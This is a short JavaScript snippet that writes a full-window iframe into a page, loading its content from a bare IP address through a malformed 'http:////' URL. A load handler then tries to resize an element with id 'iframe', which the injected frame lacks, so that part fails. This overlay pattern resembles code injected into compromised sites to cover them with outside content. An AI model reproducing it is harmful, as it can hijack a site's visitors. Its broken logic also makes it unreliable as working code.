document.writeln("<iframe scrolling=\"yes\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" width=\"100%\" height=\"100%\" src=\"http:////118.24.25.42//index.html\"><\/iframe>");

window.onload = function() {
    var iframe = document.getElementById("iframe");
    iframe.style.width = window.innerWidth + 'px';
    iframe.style.height = window.innerHeight + 'px';
};
